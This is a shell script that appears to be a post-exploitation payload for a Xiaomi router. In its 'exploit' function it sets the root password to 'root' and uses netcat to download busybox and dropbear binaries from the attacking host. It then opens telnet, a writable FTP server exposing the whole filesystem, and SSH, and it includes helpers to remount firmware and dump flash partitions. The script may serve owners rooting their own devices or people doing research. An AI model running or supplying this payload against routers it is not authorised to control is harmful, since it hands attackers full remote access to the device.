#!/bin/ash

set -euo pipefail

exploit() {
    setup_password
    setup_busybox
    start_telnet
    start_ftp
    start_ssh
    echo "Done exploiting"
}

get_file() {
    rm -rf "$2"
    echo "$1" | nc "${REMOTE_ADDR}" "${QUERY_STRING}" >"$2"
}

setup_password() {
    # Override existing password, as the default one set by xiaomi is unknown
    # https://www.systutorials.com/changing-linux-users-password-in-one-command-line/
    echo -e "root\nroot" | passwd root
}

setup_busybox() {
    # kill/stop telnet, in case it is running from a previous execution
    pgrep busybox | xargs kill || true

    cd /tmp
    get_file busybox-mipsel busybox
    chmod +x busybox
}

start_ftp() {
    cd /tmp
    ln -sfn busybox ftpd # Create symlink needed for running ftpd
    ./busybox tcpsvd -vE 0.0.0.0 21 ./ftpd -Sw / >> /tmp/messages 2>&1 &
}

start_telnet() {
    cd /tmp
    ./busybox telnetd
}

start_ssh() {
    cd /tmp

    # Clean
    rm -rf dropbear
    rm -rf /etc/dropbear

    # kill/stop dropbear, in case it is running from a previous execution
    pgrep dropbear | xargs kill || true

    # Donwload dropbear static mipsel binary
    get_file dropbearStaticMipsel.tar.bz2 dropbear.tar.bz2
    mkdir dropbear
    /tmp/busybox tar xvfj dropbear.tar.bz2 -C dropbear --strip-components=1

    # Add keys
    # http://www.ibiblio.org/elemental/howto/dropbear-ssh.html
    mkdir -p /etc/dropbear
    cd /etc/dropbear
    /tmp/dropbear/dropbearkey -t rsa -f dropbear_rsa_host_key
    /tmp/dropbear/dropbearkey -t dss -f dropbear_dss_host_key

    # Start SSH server
    /tmp/dropbear/dropbear

    # https://unix.stackexchange.com/a/402749
    # Login with ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@192.168.0.21
}

remount() {
    echo "Remount /usr/share/xiaoqiang as read-write"

    cp -R /usr/share/xiaoqiang /tmp/xiaoqiang
    mount --bind /tmp/xiaoqiang /usr/share/xiaoqiang

    echo "Done remounting"
}

# Function inspired by https://openwrt.org/docs/guide-user/installation/generic.backup#create_full_mtd_backup
mtd_backup() {
    TMPDIR="/tmp"
    BACKUP_DIR="${TMPDIR}/mtd_backup"
    OUTPUT_FILE="${TMPDIR}/mtd_backup.tgz"

    # Start
    echo "Start"
    rm -rf "${BACKUP_DIR}"
    mkdir -p "${BACKUP_DIR}"

    # List remote mtd devices from /proc/mtd. The first line is just a table
    # header, so skip it (using tail)
    cat /proc/mtd | tail -n+2 | while read; do
        MTD_DEV=$(echo ${REPLY} | cut -f1 -d:)
        MTD_NAME=$(echo ${REPLY} | cut -f2 -d\")
        echo "Backing up ${MTD_DEV} (${MTD_NAME})"
        dd if="/dev/${MTD_DEV}" of="${BACKUP_DIR}/${MTD_DEV}_${MTD_NAME}.bin"
    done
    
    # Do not compress, as the device runs out of storage for such operation
    echo "Done backing up"
}

# From https://stackoverflow.com/a/16159057
"$@"
